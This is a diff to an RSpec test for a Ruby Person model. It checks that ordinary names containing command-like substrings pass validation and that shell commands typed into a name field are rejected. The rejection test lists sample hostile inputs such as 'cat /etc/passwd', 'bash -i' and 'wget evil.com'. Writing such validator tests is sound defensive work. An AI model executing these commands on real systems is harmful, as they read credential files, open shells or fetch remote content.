@@ -59,6 +59,23 @@ describe Person, type: :model do
       person.valid?
       expect(person.name).to eq('John Doe')
     end
+
+    # Regression: real names that happen to contain command-ish substrings
+    # ("sh", "cat", "type") must NOT be flagged. The old /(...|sh|cat|type)\s/
+    # pattern rejected "Josh Adams", "Cat Stevens", etc.
+    it 'accepts ordinary names containing command-like substrings' do
+      [ 'Josh Adams', 'Ashley Rush', 'Cat Stevens', 'Cathy Brown', 'Trisha Type',
+        'Sasha Lee', 'Curly Sue', 'Bashir Khan' ].each do |name|
+        person = build(:person, name: name)
+        expect(person).to be_valid, "expected #{name.inspect} to be a valid name"
+      end
+    end
+
+    it 'still rejects actual shell commands in a name' do
+      [ 'sh -c evil', 'cat /etc/passwd', 'bash -i', 'wget evil.com' ].each do |name|
+        expect(build(:person, name: name)).not_to be_valid, "expected #{name.inspect} to be rejected"
+      end
+    end
   end
 
   describe '.suspicious' do
